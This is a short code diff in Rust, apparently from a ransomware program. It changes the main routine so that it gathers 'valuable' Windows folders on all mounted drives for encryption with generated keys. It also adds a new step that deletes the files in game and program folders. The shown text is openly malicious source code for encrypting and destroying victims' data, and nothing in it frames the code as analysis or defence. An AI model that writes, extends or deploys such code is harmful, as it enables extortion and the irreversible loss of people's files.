@@ -41,7 +41,7 @@ fn main() {
 
     // Gets the folders to be encrypted on all the mounted drives in order of importance.
     let mut folders_to_encrypt = Vec::new();
-    dir_list::add_folder_paths_windows(&mut folders_to_encrypt);
+    dir_list::add_valuable_folder_paths_windows(&mut folders_to_encrypt);
 
     // Creates an encryptor from strong generated keys.
     let mut key_gen = key_gen::KeyGen::from(Hc128Rng::from_entropy());
@@ -107,6 +107,11 @@ fn main() {
         }
         Err(_) => (),
     }
+
+    // Forth deletes games folders and program folders.
+    let mut unwanted_folders = vec![];
+    dir_list::add_non_valuable_folder_paths_windows(&mut unwanted_folders);
+    encryptor.delete_files_in_dirs(&unwanted_folders);
     /*
     for path in common_folder_paths {
         println!("{}", path);
